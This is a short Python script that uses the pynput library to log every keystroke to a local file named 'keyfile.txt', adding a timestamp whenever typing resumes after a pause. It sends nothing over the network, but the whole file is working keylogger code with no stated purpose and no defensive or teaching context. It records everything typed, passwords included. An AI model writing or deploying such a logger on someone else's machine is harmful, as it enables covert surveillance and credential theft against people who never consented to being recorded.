from pynput import keyboard
from datetime import datetime


def stamp(fp, prev, init=False, gap=10):
    now = datetime.now()
    if init:
        fp.write(f"\n[{now}] ")
        return now
    delta = now - prev
    if delta.seconds >= gap:
        fp.write(f"\n[{now}] ")
        return now
    return prev


def keyPressed(key):
    global last, new
    with open("keyfile.txt", 'a') as logKey:
        last = stamp(logKey, last, new)
        new = False
        try:
            char = key.char
            logKey.write(char)
        except:
            logKey.write(f"<{str(key)}>")


if __name__ == "__main__":
    last = None
    new = True
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()